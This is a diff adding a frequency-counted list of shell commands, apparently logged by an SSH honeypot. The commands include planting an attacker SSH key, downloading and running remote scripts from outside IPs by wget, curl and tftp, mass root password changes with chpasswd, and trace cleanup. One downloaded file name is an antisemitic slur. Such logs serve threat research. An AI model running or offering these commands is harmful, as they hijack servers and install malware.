@@ -1,0 +1,132 @@
+    106 which ls
+    106 w
+    106 uname -m
+    106 uname -a
+    106 uname
+    106 top
+    106 ls -lh $(which ls)
+    106 lscpu | grep Model
+    106 free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+    106 crontab -l
+    106 cat /proc/cpuinfo | grep name | wc -l
+    106 cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+    106 cat /proc/cpuinfo | grep model | grep name | wc -l
+    103 cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+     17 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.210.20.147/0xDSSk.sh; curl -O http://31.210.20.147/0xDSSk.sh; chmod 777 0xDSSk.sh; sh 0xDSSk.sh; tftp 31.210.20.147 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 31.210.20.147; rm -rf *.sh
+      8 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.232.48.138/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 191.232.48.138 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 191.232.48.138; chmod 777 tftp2.sh
+      3 rm -rf /var/tmp/.var03522123
+      3 rm -rf /var/tmp/dota*
+      3 echo "321" > /var/tmp/.var03522123
+      3 cat /var/tmp/.var03522123 | head -n 1
+      2 uname -s -v -n -r
+      1 /ip cloud print
+      1 echo "root:ZpNZQnJcFz6y"|chpasswd|bash
+      1 echo "root:Z07VpH2VZMf9"|chpasswd|bash
+      1 echo "root:YUT1ei4E9u0l"|chpasswd|bash
+      1 echo "root:YO65DPz8LTsh"|chpasswd|bash
+      1 echo "root:YHdPKolbSAwQ"|chpasswd|bash
+      1 echo "root:YH0hTULd9fpc"|chpasswd|bash
+      1 echo "root:yE3BSCofXuY7"|chpasswd|bash
+      1 echo "root:xUYY7cJuQAhC"|chpasswd|bash
+      1 echo "root:xSCTZSqMKCvN"|chpasswd|bash
+      1 echo "root:XRuldBoQpPiX"|chpasswd|bash
+      1 echo "root:xRTu0r1ReiMN"|chpasswd|bash
+      1 echo "root:XmpNWi4GQ08Z"|chpasswd|bash
+      1 echo "root:wyouaq3Oi89d"|chpasswd|bash
+      1 echo "root:WEODVNuGpbxA"|chpasswd|bash
+      1 echo "root:Wc2fZqRFqKlL"|chpasswd|bash
+      1 echo "root:W1mNez0jWJcI"|chpasswd|bash
+      1 echo "root:vUiXdWleKgu7"|chpasswd|bash
+      1 echo "root:VTpjLL1iFdy6"|chpasswd|bash
+      1 echo "root:VjztIYw8fE0K"|chpasswd|bash
+      1 echo "root:Vh9yO0YMDbum"|chpasswd|bash
+      1 echo "root:vA160ED42FL2"|chpasswd|bash
+      1 echo "root:V7Ysdr8dSQUa"|chpasswd|bash
+      1 echo "root:uyoyjzA3M5cQ"|chpasswd|bash
+      1 echo "root:tZ7LbGim2Eux"|chpasswd|bash
+      1 echo "root:TseczM0Sxsos"|chpasswd|bash
+      1 echo "root:TPknQabMAdKy"|chpasswd|bash
+      1 echo "root:TnB0zMJDvAZw"|chpasswd|bash
+      1 echo "root:t8zzW2wr3F4N"|chpasswd|bash
+      1 echo "root:T7Al05qnBPs3"|chpasswd|bash
+      1 echo "root:ssR50QMpSaxV"|chpasswd|bash
+      1 echo "root:sNzkvJ4HOEBm"|chpasswd|bash
+      1 echo "root:ScwFdlnL3VH0"|chpasswd|bash
+      1 echo "root:SBPVPaVD2C2l"|chpasswd|bash
+      1 echo "root:sbjYSkbPjLez"|chpasswd|bash
+      1 echo "root:RSMLIqU0fMLP"|chpasswd|bash
+      1 echo "root:rpBuUOphgpFk"|chpasswd|bash
+      1 echo "root Root321" > /tmp/up.txt
+      1 echo "root:rlWAuEpb2Fue"|chpasswd|bash
+      1 echo "root:rjWGOPggdFVm"|chpasswd|bash
+      1 echo "root:r4me7lnY7Aoj"|chpasswd|bash
+      1 echo "root qwe!@#456" > /tmp/up.txt
+      1 echo "root:qnc9uDcYkVEm"|chpasswd|bash
+      1 echo "root:PTemQs6k0bJB"|chpasswd|bash
+      1 echo "root:Pikd8LjjjOhF"|chpasswd|bash
+      1 echo "root:pIIX10Ay9VRq"|chpasswd|bash
+      1 echo "root:Pfk1ICh3gl6h"|chpasswd|bash
+      1 echo "root:PbS22WZMAbmn"|chpasswd|bash
+      1 echo "root:P3Y0ym7EF28r"|chpasswd|bash
+      1 echo "root:oyOsddN5ZJlQ"|chpasswd|bash
+      1 echo "root:ovPFh5snh0BH"|chpasswd|bash
+      1 echo "root:OvbDkEmEIPNo"|chpasswd|bash
+      1 echo "root:oEjT1zW6vgg6"|chpasswd|bash
+      1 echo "root:nwtflo0wHPMj"|chpasswd|bash
+      1 echo "root:NO2Y5rhhRQfZ"|chpasswd|bash
+      1 echo "root:MwxLxGncHnPW"|chpasswd|bash
+      1 echo "root:mkrEYnv7FwSb"|chpasswd|bash
+      1 echo "root:MJVP4ABnpMkJ"|chpasswd|bash
+      1 echo "root:mHWEUsQ2WpFz"|chpasswd|bash
+      1 echo "root:mF1XWNOodA42"|chpasswd|bash
+      1 echo "root:ld5TVt2jRokG"|chpasswd|bash
+      1 echo "root:KXonvY3Pu5e7"|chpasswd|bash
+      1 echo "root:k8RBWn3v0KDw"|chpasswd|bash
+      1 echo "root:JPUoA6xseTgk"|chpasswd|bash
+      1 echo "root:jP5zGAvBjMsu"|chpasswd|bash
+      1 echo "root:J4lnu5xVTj9x"|chpasswd|bash
+      1 echo "root:IM2yqumDXhcb"|chpasswd|bash
+      1 echo "root:hz8EgKEXr5rF"|chpasswd|bash
+      1 echo "root:HYBRvNPj8ZHm"|chpasswd|bash
+      1 echo "root:HUXZ5RneVpj9"|chpasswd|bash
+      1 echo "root:HLSSx7GGsCB6"|chpasswd|bash
+      1 echo "root:HKAwta41CuZ1"|chpasswd|bash
+      1 echo "root:HGT2xHawkP3W"|chpasswd|bash
+      1 echo "root:H6SID1EUnZXn"|chpasswd|bash
+      1 echo "root:GUUuncQWjVjP"|chpasswd|bash
+      1 echo "root:GTOMwFe7OqRn"|chpasswd|bash
+      1 echo "root:GJjn4mbTTlik"|chpasswd|bash
+      1 echo "root:GeaUO1hbsraA"|chpasswd|bash
+      1 echo "root:fZCNMtCVvioB"|chpasswd|bash
+      1 echo "root:fQerN6nYf22D"|chpasswd|bash
+      1 echo "root:fQ2GTD8daaJj"|chpasswd|bash
+      1 echo "root:fHOOGnW6vorp"|chpasswd|bash
+      1 echo "root:f9aYD0poEK0o"|chpasswd|bash
+      1 echo "root:EX1nCPAATdzI"|chpasswd|bash
+      1 echo "root:Eu4AO100CDF6"|chpasswd|bash
+      1 echo "root:EtvVDgTepTbj"|chpasswd|bash
+      1 echo "root:Etatk33bNvur"|chpasswd|bash
+      1 echo "root:eAkU11hCkNwM"|chpasswd|bash
+      1 echo "root:DUflCMberMuJ"|chpasswd|bash
+      1 echo "root:CTf5kKr1Ta1M"|chpasswd|bash
+      1 echo "root:cDi49l6SG5v6"|chpasswd|bash
+      1 echo "root:bfuBbZmKay3R"|chpasswd|bash
+      1 echo "root:avzuL7D86I2H"|chpasswd|bash
+      1 echo "root:AsU0DmZ51Rna"|chpasswd|bash
+      1 echo "root:aEn7jlMhxRQT"|chpasswd|bash
+      1 echo "root:A1FDRjrsLkRh"|chpasswd|bash
+      1 echo "root:9SgAZgmBWzFp"|chpasswd|bash
+      1 echo "root:7Xq8PoHg4XY0"|chpasswd|bash
+      1 echo "root:7LGPnxUd4V0w"|chpasswd|bash
+      1 echo "root:5lJI9kt71ewz"|chpasswd|bash
+      1 echo "root:4wG9Z1qym23l"|chpasswd|bash
+      1 echo "root:4nAHbRuGitJr"|chpasswd|bash
+      1 echo "root:3PoAGhYyqYbN"|chpasswd|bash
+      1 echo "root:3CQXvJXwsaNp"|chpasswd|bash
+      1 echo "root:36Osz8mAdyGe"|chpasswd|bash
+      1 echo "root:30q6WI4IVhJv"|chpasswd|bash
+      1 echo "root:25MSDhQteFsf"|chpasswd|bash
+      1 echo "root:1wTQinbdspKJ"|chpasswd|bash
+      1 echo "root 1234ABCDg" > /tmp/up.txt
+      1 echo "root:0PFwtUD8Duyk"|chpasswd|bash
+      1 cd /tmp; wget sinpropfenoquito.freemyip.com:8281/sshd -O /tmp/sshd; curl sinpropfenoquito.freemyip.com:8281/sshd -o /tmp/sshd; bash /tmp/sshd; rm -rf /tmp/sshd; rm -r /tmp/sshd; rm -rf /var/tmp/sshd; rm -rf /var/tmp/sshd.*; rm -rf /tmp/sshd.*
